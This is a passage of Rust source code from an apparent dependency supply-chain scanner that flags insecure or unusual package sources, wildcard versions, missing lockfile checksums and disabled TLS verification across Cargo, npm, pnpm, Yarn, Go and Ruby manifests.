                findings.extend(scan_gemfile_lock_owner_host_findings(
                    scanner,
                    file,
                    &contents,
                    context.config.ruby_source_ownership.as_slice(),
                ))
            }
            "pyproject.toml" => findings.extend(scan_pyproject_owner_host_findings(
                scanner,
                file,
                &contents,
                context.config.python_index_ownership.as_slice(),
            )),
            "Pipfile" => findings.extend(scan_pipfile_owner_host_findings(
                scanner,
                file,
                &contents,
                context.config.python_index_ownership.as_slice(),
            )),
            "poetry.lock" => findings.extend(scan_poetry_lock_owner_host_findings(
                scanner,
                file,
                &contents,
                context.config.python_index_ownership.as_slice(),
            )),
            "uv.lock" => findings.extend(scan_uv_lock_owner_host_findings(
                scanner,
                file,
                &contents,
                context.config.python_index_ownership.as_slice(),
            )),
            "Pipfile.lock" => findings.extend(scan_pipfile_lock_owner_host_findings(
                scanner,
                file,
                &contents,
                context.config.python_index_ownership.as_slice(),
            )),
            _ if file_name.starts_with("requirements") && file_name.ends_with(".txt") => findings
                .extend(scan_requirements_owner_host_findings(
                    scanner,
                    file,
                    &contents,
                    context.config.python_index_ownership.as_slice(),
                )),
            _ => {}
        }
    }

    Ok(findings)
}

fn scan_cargo_manifest(scanner: &'static str, file: &Path, contents: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut current_section = String::new();

    for (line_number, line) in contents.lines().enumerate() {
        let line_number = line_number + 1;
        let trimmed = strip_inline_comment(line).trim();

        if trimmed.is_empty() {
            continue;
        }

        if trimmed.starts_with('[') && trimmed.ends_with(']') {
            current_section = trimmed.to_string();

            if trimmed.starts_with("[patch.") || trimmed == "[replace]" {
                findings.push(
                    Finding::new(
                        "dependency.cargo.source-override",
                        scanner,
                        Severity::Medium,
                        Confidence::High,
                        FindingCategory::Dependency,
                        Some(file.to_path_buf()),
                        "Cargo dependency source override detected",
                        "The Cargo manifest uses `[patch]` or `[replace]`, which can redirect dependency provenance and should receive careful review.",
                        "Confirm the override is intentional, narrowly scoped, and documented.",
                        format!("dependency-cargo-override:{}:{}", file.display(), line_number),
                    )
                    .with_line(line_number),
                );
            }

            continue;
        }

        let in_dependency_section = current_section.contains("dependencies");
        if !in_dependency_section {
            continue;
        }

        if trimmed.contains("git = ") {
            let severity = if trimmed.contains("branch = ") || trimmed.contains("tag = ") {
                Severity::High
            } else {
                Severity::Medium
            };

            findings.push(
                Finding::new(
                    "dependency.cargo.git-source",
                    scanner,
                    severity,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Cargo dependency uses a direct Git source",
                    "A Cargo dependency is sourced directly from Git rather than a registry snapshot.",
                    "Prefer reviewed registry releases or pin the Git dependency to an auditable immutable revision with explicit justification.",
                    format!("dependency-cargo-git:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }

        if trimmed.contains("path = ") {
            findings.push(
                Finding::new(
                    "dependency.cargo.path-source",
                    scanner,
                    Severity::Low,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Cargo dependency uses a local path source",
                    "A Cargo dependency is sourced from a local path. This is often valid in monorepos, but it weakens portability and deserves review in security-sensitive flows.",
                    "Confirm the path dependency is intentional and part of a controlled workspace layout.",
                    format!("dependency-cargo-path:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }

        if trimmed.contains("http://") {
            findings.push(
                Finding::new(
                    "dependency.cargo.insecure-source",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Cargo dependency source uses insecure HTTP transport",
                    "The Cargo manifest references dependency metadata over plain HTTP.",
                    "Switch the dependency source to HTTPS or another authenticated, integrity-preserving transport.",
                    format!("dependency-cargo-http:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }

        if trimmed.contains("version = \"*\"") || trimmed.ends_with("= \"*\"") {
            findings.push(
                Finding::new(
                    "dependency.cargo.wildcard-version",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Cargo dependency uses a wildcard version",
                    "The Cargo manifest uses `*`, which removes meaningful reviewable pinning constraints for that dependency.",
                    "Replace the wildcard with an explicit semver range that matches the intended update policy.",
                    format!("dependency-cargo-wildcard:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }
    }

    findings
}

fn scan_cargo_lock(scanner: &'static str, file: &Path, contents: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut in_package = false;
    let mut current_package_name: Option<String> = None;
    let mut registry_source = false;
    let mut has_checksum = false;

    for (line_number, line) in contents.lines().enumerate() {
        let line_number = line_number + 1;
        let trimmed = line.trim();

        if trimmed == "[[package]]" {
            finalize_cargo_lock_package(
                scanner,
                file,
                &mut findings,
                &current_package_name,
                registry_source,
                has_checksum,
                line_number,
            );
            in_package = true;
            current_package_name = None;
            registry_source = false;
            has_checksum = false;
            continue;
        }

        if !in_package {
            continue;
        }

        if let Some(name) = trimmed.strip_prefix("name = \"") {
            current_package_name = Some(name.trim_end_matches('"').to_string());
        }

        if let Some(source) = trimmed.strip_prefix("source = \"") {
            let source = source.trim_end_matches('"');
            if source.starts_with("git+") {
                findings.push(
                    Finding::new(
                        "dependency.cargo-lock.git-source",
                        scanner,
                        Severity::High,
                        Confidence::High,
                        FindingCategory::Dependency,
                        Some(file.to_path_buf()),
                        "Cargo lockfile contains a Git-sourced package",
                        "The lockfile includes a package resolved from Git rather than a registry release.",
                        "Review the package provenance carefully and prefer immutable, reviewable registry releases where possible.",
                        format!("dependency-cargo-lock-git:{}:{}", file.display(), line_number),
                    )
                    .with_line(line_number),
                );
            }

            if source.starts_with("registry+http://") || source.starts_with("sparse+http://") {
                findings.push(
                    Finding::new(
                        "dependency.cargo-lock.insecure-registry",
                        scanner,
                        Severity::High,
                        Confidence::High,
                        FindingCategory::Dependency,
                        Some(file.to_path_buf()),
                        "Cargo lockfile references an insecure registry source",
                        "The lockfile references a registry over plain HTTP, which weakens dependency transport integrity.",
                        "Use HTTPS-backed registries only.",
                        format!(
                            "dependency-cargo-lock-http:{}:{}",
                            file.display(),
                            line_number
                        ),
                    )
                    .with_line(line_number),
                );
            }

            registry_source = source.starts_with("registry+") || source.starts_with("sparse+");
        }

        if trimmed.starts_with("checksum = ") {
            has_checksum = true;
        }
    }

    finalize_cargo_lock_package(
        scanner,
        file,
        &mut findings,
        &current_package_name,
        registry_source,
        has_checksum,
        contents.lines().count(),
    );

    findings
}

fn finalize_cargo_lock_package(
    scanner: &'static str,
    file: &Path,
    findings: &mut Vec<Finding>,
    current_package_name: &Option<String>,
    registry_source: bool,
    has_checksum: bool,
    line_number: usize,
) {
    if registry_source && !has_checksum {
        findings.push(
            Finding::new(
                "dependency.cargo-lock.missing-checksum",
                scanner,
                Severity::Medium,
                Confidence::Medium,
                FindingCategory::Dependency,
                Some(file.to_path_buf()),
                "Cargo registry package is missing a lockfile checksum",
                format!(
                    "The lockfile package `{}` uses a registry source but does not expose a checksum entry.",
                    current_package_name.as_deref().unwrap_or("<unknown>")
                ),
                "Review the lockfile provenance and ensure the dependency source preserves registry integrity metadata.",
                format!(
                    "dependency-cargo-lock-checksum:{}:{}:{}",
                    file.display(),
                    line_number,
                    current_package_name.as_deref().unwrap_or("<unknown>")
                ),
            )
            .with_line(line_number),
        );
    }
}

fn scan_package_json_manifest(scanner: &'static str, file: &Path, contents: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut current_section: Option<&str> = None;
    let mut section_depth = 0isize;

    for (line_number, line) in contents.lines().enumerate() {
        let line_number = line_number + 1;
        let trimmed = line.trim();

        if current_section.is_none() {
            for section in [
                "dependencies",
                "devDependencies",
                "optionalDependencies",
                "peerDependencies",
            ] {
                let marker = format!("\"{section}\"");
                if trimmed.starts_with(&marker) && trimmed.contains('{') {
                    current_section = Some(section);
                    section_depth = brace_delta(trimmed);
                    break;
                }
            }
        } else {
            section_depth += brace_delta(trimmed);
            if section_depth < 0 {
                section_depth = 0;
            }
            if section_depth == 0 {
                current_section = None;
                continue;
            }

            if let Some((dependency_name, spec)) = parse_json_dependency_entry(trimmed) {
                for finding in scan_dependency_spec(
                    scanner,
                    file,
                    line_number,
                    current_section.unwrap_or("dependencies"),
                    dependency_name,
                    spec,
                ) {
                    findings.push(finding);
                }
            }
        }
    }

    findings
}

fn scan_npmrc_dependency_config(
    scanner: &'static str,
    file: &Path,
    contents: &str,
) -> Vec<Finding> {
    let mut findings = Vec::new();

    for (line_number, line) in contents.lines().enumerate() {
        let line_number = line_number + 1;
        let trimmed = strip_inline_comment(line).trim();
        if trimmed.is_empty() {
            continue;
        }

        let Some((key, raw_value)) = trimmed.split_once('=') else {
            continue;
        };
        let key = key.trim();
        let value = trim_wrapping_quotes(raw_value.trim());
        let lower_key = key.to_ascii_lowercase();
        let lower_value = value.to_ascii_lowercase();

        if lower_key.ends_with(":registry") || lower_key == "registry" {
            if lower_value.starts_with("http://") {
                findings.push(
                    Finding::new(
                        "dependency.node.registry.insecure-url",
                        scanner,
                        Severity::High,
                        Confidence::High,
                        FindingCategory::Dependency,
                        Some(file.to_path_buf()),
                        "Node registry config uses insecure HTTP transport",
                        "The tracked `.npmrc` file points a package registry at plain HTTP, which weakens dependency transport integrity.",
                        "Use HTTPS-backed registries only.",
                        format!("dependency-node-registry-http:{}:{}", file.display(), line_number),
                    )
                    .with_line(line_number),
                );
            } else if lower_key.ends_with(":registry")
                || !lower_value.contains("registry.npmjs.org")
            {
                findings.push(
                    Finding::new(
                        "dependency.node.registry.custom-source",
                        scanner,
                        Severity::Medium,
                        Confidence::High,
                        FindingCategory::Dependency,
                        Some(file.to_path_buf()),
                        "Node registry config defines a non-default package source",
                        "The tracked `.npmrc` file changes package provenance away from the default npm registry or introduces a scoped registry override.",
                        "Confirm the custom registry is intentional, authenticated, and documented as part of the repository's dependency trust model.",
                        format!("dependency-node-registry-source:{}:{}", file.display(), line_number),
                    )
                    .with_line(line_number),
                );
            }
        }

        if lower_key == "strict-ssl" && lower_value == "false" {
            findings.push(
                Finding::new(
                    "dependency.node.registry.tls-disabled",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Node registry config disables TLS verification",
                    "The tracked `.npmrc` file disables strict SSL verification for package downloads.",
                    "Enable TLS verification and rely on authenticated HTTPS registries.",
                    format!("dependency-node-registry-tls:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }
    }

    findings
}

fn scan_dependency_spec(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    section: &str,
    dependency_name: &str,
    spec: &str,
) -> Vec<Finding> {
    let mut findings = Vec::new();
    let normalized = spec.trim();
    let lower = normalized.to_ascii_lowercase();

    if matches!(lower.as_str(), "*" | "latest")
        || lower == "x"
        || lower.ends_with(".x")
        || lower.contains(": *")
    {
        findings.push(
            Finding::new(
                "dependency.node.unbounded-version",
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Dependency,
                Some(file.to_path_buf()),
                "Node dependency uses an unbounded version selector",
                format!(
                    "The `{dependency_name}` dependency in `{section}` uses `{normalized}`, which weakens reviewable version control."
                ),
                "Replace the selector with an explicit semver range or exact version that matches the intended update policy.",
                format!(
                    "dependency-node-unbounded:{}:{}:{}",
                    file.display(),
                    line_number,
                    dependency_name
                ),
            )
            .with_line(line_number),
        );
    }

    let direct_source = if lower.starts_with("git://") {
        Some((
            Severity::High,
            "Node dependency uses insecure Git transport",
        ))
    } else if lower.starts_with("http://") {
        Some((
            Severity::High,
            "Node dependency uses insecure HTTP transport",
        ))
    } else if lower.starts_with("git+")
        || lower.starts_with("github:")
        || lower.starts_with("gitlab:")
        || lower.starts_with("bitbucket:")
        || lower.starts_with("https://")
    {
        Some((
            Severity::High,
            "Node dependency uses a direct remote source",
        ))
    } else if lower.starts_with("file:") || lower.starts_with("link:") {
        Some((Severity::Medium, "Node dependency uses a local path source"))
    } else {
        None
    };

    if let Some((severity, title)) = direct_source {
        findings.push(
            Finding::new(
                "dependency.node.direct-source",
                scanner,
                severity,
                Confidence::High,
                FindingCategory::Dependency,
                Some(file.to_path_buf()),
                title,
                format!(
                    "The `{dependency_name}` dependency in `{section}` resolves from `{normalized}` rather than a standard registry release."
                ),
                "Prefer reviewed registry releases and lockfiles where possible. If a direct source is required, document and justify it explicitly.",
                format!(
                    "dependency-node-direct-source:{}:{}:{}",
                    file.display(),
                    line_number,
                    dependency_name
                ),
            )
            .with_line(line_number),
        );
    }

    findings
}

fn scan_package_lock(scanner: &'static str, file: &Path, contents: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    let has_integrity = contents.contains("\"integrity\"");

    if !has_integrity {
        findings.push(Finding::new(
            "dependency.node.lockfile.missing-integrity",
            scanner,
            Severity::Medium,
            Confidence::Medium,
            FindingCategory::Dependency,
            Some(file.to_path_buf()),
            "Node lockfile does not expose integrity hashes",
            "The lockfile does not appear to contain `integrity` metadata, which weakens package tamper verification.",
            "Regenerate the lockfile with a package manager version that emits integrity metadata, or confirm the ecosystem's equivalent integrity mechanism.",
            format!("dependency-node-lockfile-integrity:{}", file.display()),
        ));
    }

    for (line_number, line) in contents.lines().enumerate() {
        let line_number = line_number + 1;
        let trimmed = line.trim();

        if trimmed.contains("\"resolved\": \"http://") {
            findings.push(
                Finding::new(
                    "dependency.node.lockfile.insecure-resolved-url",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Node lockfile resolves a package over insecure HTTP",
                    "The lockfile contains a package resolution URL using plain HTTP.",
                    "Use HTTPS-backed package sources only.",
                    format!(
                        "dependency-node-lockfile-http:{}:{}",
                        file.display(),
                        line_number
                    ),
                )
                .with_line(line_number),
            );
        }

        if trimmed.contains("\"resolved\": \"git+") || trimmed.contains("\"version\": \"git+") {
            findings.push(
                Finding::new(
                    "dependency.node.lockfile.git-source",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Node lockfile contains a Git-sourced package",
                    "The lockfile includes a package resolved directly from Git.",
                    "Prefer registry-backed releases or document the provenance and review path for the Git source.",
                    format!("dependency-node-lockfile-git:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }
    }

    findings
}

fn scan_node_lock_owner_host_findings(
    scanner: &'static str,
    file: &Path,
    contents: &str,
    ownership_rules: &[String],
) -> Vec<Finding> {
    if ownership_rules.is_empty() {
        return Vec::new();
    }

    let Ok(value) = serde_json::from_str::<Value>(contents) else {
        return Vec::new();
    };

    let mut findings = Vec::new();
    let mut seen = HashSet::new();

    if let Some(packages) = value.get("packages").and_then(Value::as_object) {
        for (path_key, package) in packages {
            if path_key.is_empty() {
                continue;
            }

            let Some(host) = package
                .get("resolved")
                .and_then(Value::as_str)
                .and_then(extract_registry_host)
            else {
                continue;
            };
            let name = package
                .get("name")
                .and_then(Value::as_str)
                .map(ToOwned::to_owned)
                .or_else(|| derive_package_name_from_lock_path(path_key));
            let Some(name) = name else {
                continue;
            };

            record_node_owner_host_mismatch(
                scanner,
                file,
                &name,
                &host,
                ownership_rules,
                &mut findings,
                &mut seen,
            );
        }

        return findings;
    }

    if let Some(entries) = value.get("dependencies").and_then(Value::as_object) {
        collect_legacy_node_lock_host_findings(
            scanner,
            file,
            entries,
            ownership_rules,
            &mut findings,
            &mut seen,
        );
    }

    findings
}

fn scan_package_json_owner_host_findings(
    scanner: &'static str,
    file: &Path,
    contents: &str,
    ownership_rules: &[String],
) -> Vec<Finding> {
    if ownership_rules.is_empty() {
        return Vec::new();
    }

    let mut findings = Vec::new();
    let mut seen = HashSet::new();
    let mut current_section: Option<&str> = None;
    let mut section_depth = 0isize;

    for line in contents.lines() {
        let trimmed = line.trim();

        if current_section.is_none() {
            for section in [
                "dependencies",
                "devDependencies",
                "optionalDependencies",
                "peerDependencies",
            ] {
                let marker = format!("\"{section}\"");
                if trimmed.starts_with(&marker) && trimmed.contains('{') {
                    current_section = Some(section);
                    section_depth = brace_delta(trimmed);
                    break;
                }
            }
            continue;
        }

        section_depth += brace_delta(trimmed);
        if section_depth < 0 {
            section_depth = 0;
        }
        if section_depth == 0 {
            current_section = None;
            continue;
        }

        let Some((dependency_name, spec)) = parse_json_dependency_entry(trimmed) else {
            continue;
        };
        let Some(host) = dependency_spec_host(spec) else {
            continue;
        };

        record_node_manifest_owner_host_mismatch(
            scanner,
            file,
            dependency_name,
            &host,
            ownership_rules,
            &mut findings,
            &mut seen,
        );
        record_node_manifest_direct_source_owner_bypass(
            scanner,
            file,
            dependency_name,
            &host,
            ownership_rules,
            &mut findings,
            &mut seen,
        );
    }

    findings
}

fn scan_pnpm_lock(scanner: &'static str, file: &Path, contents: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    for (line_number, line) in contents.lines().enumerate() {
        let line_number = line_number + 1;
        let trimmed = line.trim();

        if trimmed.contains("tarball: http://") {
            findings.push(
                Finding::new(
                    "dependency.pnpm.insecure-tarball",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "pnpm lockfile resolves a tarball over insecure HTTP",
                    "The lockfile references a tarball URL over plain HTTP.",
                    "Use HTTPS-backed package sources only.",
                    format!("dependency-pnpm-http:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }

        if trimmed.contains("tarball: https://") || trimmed.contains("git+") {
            findings.push(
                Finding::new(
                    "dependency.pnpm.direct-remote-source",
                    scanner,
                    Severity::Medium,
                    Confidence::Medium,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "pnpm lockfile contains a direct remote dependency source",
                    "The lockfile references a tarball or Git source directly rather than a normal registry release path.",
                    "Confirm the remote source is intentional and reviewable.",
                    format!("dependency-pnpm-remote:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }
    }

    findings
}

fn scan_pnpm_lock_owner_host_findings(
    scanner: &'static str,
    file: &Path,
    contents: &str,
    ownership_rules: &[String],
) -> Vec<Finding> {
    if ownership_rules.is_empty() {
        return Vec::new();
    }

    let mut findings = Vec::new();
    let mut seen = HashSet::new();
    let mut current_name: Option<String> = None;

    for line in contents.lines() {
        let trimmed = line.trim();
        if trimmed.ends_with(':') {
            let key = trimmed
                .trim_end_matches(':')
                .trim_matches('"')
                .trim_matches('\'');
            if let Some((name, _)) = parse_pnpm_package_key(key) {
                current_name = Some(name);
            }
            continue;
        }

        let Some(name) = current_name.as_deref() else {
            continue;
        };
        let Some(tarball) = trimmed.strip_prefix("tarball:") else {
            continue;
        };
        let Some(host) = extract_registry_host(tarball.trim()) else {
            continue;
        };

        record_node_lock_owner_host_mismatch(
            scanner,
            file,
            name,
            &host,
            ownership_rules,
            &mut findings,
            &mut seen,
        );
    }

    findings
}

fn scan_yarn_lock(scanner: &'static str, file: &Path, contents: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    if !contents.contains("\nintegrity ") && !contents.trim_start().starts_with("integrity ") {
        findings.push(Finding::new(
            "dependency.yarn.lockfile.missing-integrity",
            scanner,
            Severity::Medium,
            Confidence::Medium,
            FindingCategory::Dependency,
            Some(file.to_path_buf()),
            "Yarn lockfile does not expose integrity hashes",
            "The Yarn lockfile does not appear to contain `integrity` metadata, which weakens package tamper verification.",
            "Regenerate the lockfile with a Yarn version that emits integrity metadata, or confirm the repository's integrity mechanism.",
            format!("dependency-yarn-lockfile-integrity:{}", file.display()),
        ));
    }

    for (line_number, line) in contents.lines().enumerate() {
        let line_number = line_number + 1;
        let trimmed = line.trim();

        if trimmed.starts_with("resolved \"http://") {
            findings.push(
                Finding::new(
                    "dependency.yarn.lockfile.insecure-resolved-url",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Yarn lockfile resolves a package over insecure HTTP",
                    "The lockfile contains a package resolution URL using plain HTTP.",
                    "Use HTTPS-backed package sources only.",
                    format!(
                        "dependency-yarn-lockfile-http:{}:{}",
                        file.display(),
                        line_number
                    ),
                )
                .with_line(line_number),
            );
        }

        if trimmed.starts_with("resolved \"git+")
            || trimmed.starts_with("resolved \"https://github.com/")
            || trimmed.starts_with("resolved \"https://codeload.github.com/")
        {
            findings.push(
                Finding::new(
                    "dependency.yarn.lockfile.direct-remote-source",
                    scanner,
                    Severity::Medium,
                    Confidence::Medium,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Yarn lockfile contains a direct remote package source",
                    "The lockfile references a Git or archive URL directly rather than a normal registry release path.",
                    "Confirm the remote source is intentional, reviewable, and pinned through a lockfile you trust.",
                    format!("dependency-yarn-lockfile-remote:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }
    }

    findings
}

fn scan_yarn_lock_owner_host_findings(
    scanner: &'static str,
    file: &Path,
    contents: &str,
    ownership_rules: &[String],
) -> Vec<Finding> {
    if ownership_rules.is_empty() {
        return Vec::new();
    }

    let mut findings = Vec::new();
    let mut seen = HashSet::new();
    let mut current_name: Option<String> = None;
    let mut current_host: Option<String> = None;

    for line in contents.lines() {
        let trimmed = line.trim_end();
        let is_entry_header =
            !line.starts_with(' ') && !line.starts_with('\t') && trimmed.ends_with(':');

        if is_entry_header {
            if let (Some(name), Some(host)) = (current_name.take(), current_host.take()) {
                record_node_owner_host_mismatch(
                    scanner,
                    file,
                    &name,
                    &host,
                    ownership_rules,
                    &mut findings,
                    &mut seen,
                );
            }

            current_name = trimmed
                .trim_end_matches(':')
                .split(", ")
                .find_map(parse_yarn_selector_name);
            current_host = None;
            continue;
        }

        if let Some(resolved) = trimmed.trim().strip_prefix("resolved ") {
            current_host = extract_registry_host(resolved);
        }
    }

    if let (Some(name), Some(host)) = (current_name, current_host) {
        record_node_owner_host_mismatch(
            scanner,
            file,
            &name,
            &host,
            ownership_rules,
            &mut findings,
            &mut seen,
        );
    }

    findings
}

fn scan_yarnrc_dependency_config(
    scanner: &'static str,
    file: &Path,
    contents: &str,
) -> Vec<Finding> {
    let mut findings = Vec::new();

    for (line_number, line) in contents.lines().enumerate() {
        let line_number = line_number + 1;
        let trimmed = strip_inline_comment(line).trim();
        if trimmed.is_empty() {
            continue;
        }

        if let Some(value) = yaml_scalar_value(trimmed, "npmRegistryServer:") {
            if value.starts_with("http://") {
                findings.push(
                    Finding::new(
                        "dependency.node.registry.insecure-url",
                        scanner,
                        Severity::High,
                        Confidence::High,
                        FindingCategory::Dependency,
                        Some(file.to_path_buf()),
                        "Yarn registry config uses insecure HTTP transport",
                        "The tracked Yarn config points a package registry at plain HTTP, which weakens dependency transport integrity.",
                        "Use HTTPS-backed registries only.",
                        format!("dependency-yarn-registry-http:{}:{}", file.display(), line_number),
                    )
                    .with_line(line_number),
                );
            } else if !value.contains("registry.yarnpkg.com")
                && !value.contains("registry.npmjs.org")
            {
                findings.push(
                    Finding::new(
                        "dependency.node.registry.custom-source",
                        scanner,
                        Severity::Medium,
                        Confidence::High,
                        FindingCategory::Dependency,
                        Some(file.to_path_buf()),
                        "Yarn config defines a non-default package source",
                        "The tracked Yarn config changes package provenance away from the default npm or Yarn registry.",
                        "Confirm the custom registry is intentional, authenticated, and documented as part of the repository's dependency trust model.",
                        format!("dependency-yarn-registry-source:{}:{}", file.display(), line_number),
                    )
                    .with_line(line_number),
                );
            }
        }

        if let Some(value) = yaml_scalar_value(trimmed, "npmRegistryServer:") {
            if value.starts_with("http://")
                || (!value.contains("registry.yarnpkg.com")
                    && !value.contains("registry.npmjs.org"))
            {
                continue;
            }
        }

        if let Some(value) = yaml_scalar_value(trimmed, "enableStrictSsl:") {
            if value == "false" {
                findings.push(
                    Finding::new(
                        "dependency.node.registry.tls-disabled",
                        scanner,
                        Severity::High,
                        Confidence::High,
                        FindingCategory::Dependency,
                        Some(file.to_path_buf()),
                        "Yarn config disables TLS verification",
                        "The tracked Yarn config disables strict SSL verification for package downloads.",
                        "Enable TLS verification and rely on authenticated HTTPS registries.",
                        format!("dependency-yarn-registry-tls:{}:{}", file.display(), line_number),
                    )
                    .with_line(line_number),
                );
            }
        }

        if trimmed.starts_with("unsafeHttpWhitelist:") {
            findings.push(
                Finding::new(
                    "dependency.node.registry.unsafe-http-whitelist",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Yarn config allows insecure HTTP package hosts",
                    "The tracked Yarn config includes an unsafe HTTP allowlist for package hosts, weakening dependency transport trust.",
                    "Remove the unsafe HTTP allowlist and rely on authenticated HTTPS registries.",
                    format!("dependency-yarn-unsafe-http:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }
    }

    findings
}

fn scan_cargo_dependency_config(
    scanner: &'static str,
    file: &Path,
    contents: &str,
) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut current_section = String::new();

    for (line_number, line) in contents.lines().enumerate() {
        let line_number = line_number + 1;
        let trimmed = strip_inline_comment(line).trim();
        if trimmed.is_empty() {
            continue;
        }

        if trimmed.starts_with('[') && trimmed.ends_with(']') {
            current_section = trimmed.to_string();
            continue;
        }

        if let Some(value) = toml_assignment_value(trimmed, "replace-with") {
            findings.push(
                Finding::new(
                    "dependency.cargo.registry.replace-with",
                    scanner,
                    Severity::Medium,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "Cargo source config replaces the default registry",
                    format!(
                        "The tracked Cargo config uses `replace-with = \"{value}\"`, which redirects dependency provenance away from the default crates.io source."
                    ),
                    "Confirm the replacement registry is intentional, authenticated, and documented as part of the repository's dependency trust model.",
                    format!("dependency-cargo-replace-with:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }

        for key in ["registry", "index"] {
            let Some(value) = toml_assignment_value(trimmed, key) else {
                continue;
            };

            if value.starts_with("http://") || value.starts_with("sparse+http://") {
                findings.push(
                    Finding::new(
                        "dependency.cargo.registry.insecure-url",
                        scanner,
                        Severity::High,
                        Confidence::High,
                        FindingCategory::Dependency,
                        Some(file.to_path_buf()),
                        "Cargo source config uses insecure HTTP transport",
                        "The tracked Cargo config points a registry or index at plain HTTP, which weakens dependency transport integrity.",
                        "Use HTTPS-backed registries only.",
                        format!("dependency-cargo-registry-http:{}:{}", file.display(), line_number),
                    )
                    .with_line(line_number),
                );
            } else if current_section.starts_with("[source.")
                || current_section.starts_with("[registries.")
            {
                findings.push(
                    Finding::new(
                        "dependency.cargo.registry.custom-source",
                        scanner,
                        Severity::Medium,
                        Confidence::High,
                        FindingCategory::Dependency,
                        Some(file.to_path_buf()),
                        "Cargo config defines a non-default registry source",
                        "The tracked Cargo config defines a custom registry or source, which changes dependency provenance away from the default crates.io path.",
                        "Confirm the custom Cargo registry is intentional, authenticated, and documented as part of the repository's dependency trust model.",
                        format!("dependency-cargo-registry-source:{}:{}", file.display(), line_number),
                    )
                    .with_line(line_number),
                );
            }
        }
    }

    findings
}

fn scan_go_mod(scanner: &'static str, file: &Path, contents: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut in_replace_block = false;

    for (line_number, line) in contents.lines().enumerate() {
        let line_number = line_number + 1;
        let trimmed = strip_inline_comment(line).trim();
        if trimmed.is_empty() {
            continue;
        }

        if trimmed == ")" {
            in_replace_block = false;
            continue;
        }

        if trimmed == "replace (" {
            in_replace_block = true;
            continue;
        }

        let replace_line = if in_replace_block {
            trimmed.contains("=>")
        } else {
            trimmed.starts_with("replace ") && trimmed.contains("=>")
        };

        if !replace_line {
            continue;
        }

        findings.push(
            Finding::new(
                "dependency.go.replace-directive",
                scanner,
                Severity::Medium,
                Confidence::High,
                FindingCategory::Dependency,
                Some(file.to_path_buf()),
                "go.mod contains a module replacement directive",
                "A Go module replacement changes dependency provenance away from the default module resolution path and should receive careful review.",
                "Confirm the replacement is intentional, auditable, and scoped as narrowly as possible.",
                format!("dependency-go-replace:{}:{}", file.display(), line_number),
            )
            .with_line(line_number),
        );

        let Some((_, replacement)) = trimmed.split_once("=>") else {
            continue;
        };
        let replacement_target = replacement
            .trim()
            .split_whitespace()
            .next()
            .unwrap_or_default()
            .trim_matches('"');

        if replacement_target.starts_with("http://") {
            findings.push(
                Finding::new(
                    "dependency.go.insecure-source",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "go.mod replacement uses insecure HTTP transport",
                    "The Go module replacement points at a plain HTTP source, which weakens dependency transport integrity.",
                    "Use HTTPS-backed sources only.",
                    format!("dependency-go-http:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        } else if looks_like_local_path_reference(replacement_target) {
            findings.push(
                Finding::new(
                    "dependency.go.local-source",
                    scanner,
                    Severity::Low,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "go.mod replacement uses a local path source",
                    "The Go module replacement points at a local path, which can be valid in controlled workspaces but deserves review in a security gate.",
                    "Confirm the local replacement is intentional and part of a controlled workspace layout.",
                    format!("dependency-go-path:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }
    }

    findings
}

fn scan_gemfile(scanner: &'static str, file: &Path, contents: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    for (line_number, line) in contents.lines().enumerate() {
        let line_number = line_number + 1;
        let trimmed = strip_inline_comment(line).trim();
        if trimmed.is_empty() {
            continue;
        }

        if trimmed.starts_with("source ") {
            if trimmed.contains("http://") {
                findings.push(
                    Finding::new(
                        "dependency.ruby.insecure-source",
                        scanner,
                        Severity::High,
                        Confidence::High,
                        FindingCategory::Dependency,
                        Some(file.to_path_buf()),
                        "Gemfile uses an insecure package source",
